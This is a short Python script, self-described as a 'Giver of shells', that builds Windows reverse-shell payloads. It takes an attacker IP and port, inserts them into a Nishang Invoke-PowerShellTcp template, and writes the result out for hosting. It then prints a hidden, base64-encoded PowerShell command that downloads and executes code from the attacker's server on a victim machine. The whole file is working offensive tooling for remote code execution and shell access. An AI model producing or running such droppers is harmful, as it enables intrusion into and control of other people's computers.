#!python3

import argparse, base64

parser = argparse.ArgumentParser(description = "Giver of shells")
parser.add_argument('-i', '--ip-address', help="Attacker IP Address", required=True)
parser.add_argument('-p', '--port', help="Attacker Port")
args = parser.parse_args()

if args.ip_address != None:
	ipaddr = args.ip_address

if args.port != None:
	port = args.port
else:
	port = "12345"

print("The attacker server is set to %s:%s"  % (ipaddr, port))

# A base shell to pull
def nishang_powershell():
	print("Getting Nishang...")
	nishang_shell = get_resource("resources/Invoke-PowerShellTcp.ps1")
	print("Writing Invoke-PowerShellTcp.ps1 to web_delivery")
	print("This is your raw request")
	print("Host ./resources on a server and call from the victim using:")
	set_resource("Invoke-PowerShellTcp.ps1", nishang_shell)

# Get a resource
def get_resource(filename):
	resource_data = ""
	with open(filename, "r") as filecontents:
		resource_data = filecontents.read()
		resource_data = resource_data.replace(
				"TEMPLATEIPADDRESS",
				ipaddr
				).replace(
				"TEMPLATEPORT",
				port)
	return resource_data

# Write out a resource
def set_resource(filename, filecontents):
	destination_file = open(filename, "w")
	destination_file.write(filecontents)
	destination_file.close()

# The base command to pull files from the attackers machine to the victim machine
def raw_dropper(filename):
	base_payload="IEX (new-object system.net.webclient).downloadstring('http://%s:%s/%s')" % (ipaddr, port, filename)
	base64_base_payload = base64.b64encode(base_payload.encode('utf-16-le'))
	print("powershell.exe -nop -w hidden -e %s" % base64_base_payload.decode('utf-8'))
	print(base_payload)

nishang_powershell()
raw_dropper("test")
